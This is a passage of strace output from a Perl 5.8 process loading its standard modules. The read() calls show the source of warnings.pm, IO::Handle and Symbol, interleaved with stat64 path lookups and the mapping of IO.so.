\'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
12207 20:24:32.556987 brk(0x81b6000)    = 0x81b6000
12207 20:24:32.557003 brk(0x81b5000)    = 0x81b5000
12207 20:24:32.557082 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
12207 20:24:32.557574 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
12207 20:24:32.558367 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
12207 20:24:32.558513 read(8, "", 4096) = 0
12207 20:24:32.558526 close(8)          = 0
12207 20:24:32.558715 _llseek(6, 412, [412], SEEK_SET) = 0
12207 20:24:32.558748 _llseek(6, 0, [412], SEEK_CUR) = 0
12207 20:24:32.558759 close(6)          = 0
12207 20:24:32.558801 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12207 20:24:32.558825 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12207 20:24:32.558852 futex(0xb7f01070, 0x81 /* FUTEX_??? */, 2147483647) = 0
12207 20:24:32.558872 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
12207 20:24:32.558887 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12207 20:24:32.558974 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12207 20:24:32.558999 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f05000
12207 20:24:32.559012 mmap2(0xb7f09000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f09000
12207 20:24:32.559026 close(6)          = 0
12207 20:24:32.559151 stat64("/etc/perl/IO/Handle.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.559153 stat64("/etc/perl/IO/Handle.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559154 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.559154 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559154 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.559154 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559154 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.559155 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559155 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.559155 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559155 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.559156 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
12207 20:24:32.559156 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
12207 20:24:32.559156 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaf18) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.559156 _llseek(6, 0, [0], SEEK_CUR) = 0
12207 20:24:32.559156 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
12207 20:24:32.559522 stat64("/etc/perl/Symbol.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559538 stat64("/etc/perl/Symbol.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559552 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559565 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559578 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559594 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559608 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559620 stat64("/usr/lib/perl5/Symbol.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559633 stat64("/usr/share/perl5/Symbol.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559645 stat64("/usr/share/perl5/Symbol.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559657 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559680 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559721 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.559748 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
12207 20:24:32.559770 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.559784 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.559796 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.559827 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], 